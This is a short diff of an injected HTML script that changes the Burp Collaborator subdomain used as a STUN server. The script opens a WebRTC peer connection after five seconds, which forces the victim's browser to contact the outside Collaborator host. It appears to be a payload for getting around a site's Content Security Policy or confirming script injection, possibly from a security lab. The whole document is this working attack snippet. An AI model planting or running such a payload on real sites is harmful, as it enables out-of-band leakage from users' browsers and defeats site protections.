@@ -1,6 +1,6 @@
 <script>
 setTimeout(() => {
-  	var peerConn=new RTCPeerConnection({'iceServers':[{'urls':['stun:ma0pdb1031oxe4wzdikzwse24taryg.burpcollaborator.net']}]});
+  	var peerConn=new RTCPeerConnection({'iceServers':[{'urls':['stun:jm9139xrdd6hzhsljh3li24ar1xslh.burpcollaborator.net']}]});
     var dataChannel=peerConn.createDataChannel('x');
     peerConn.createOffer({}).then((desc)=>peerConn.setLocalDescription(desc))
 }, 5000)
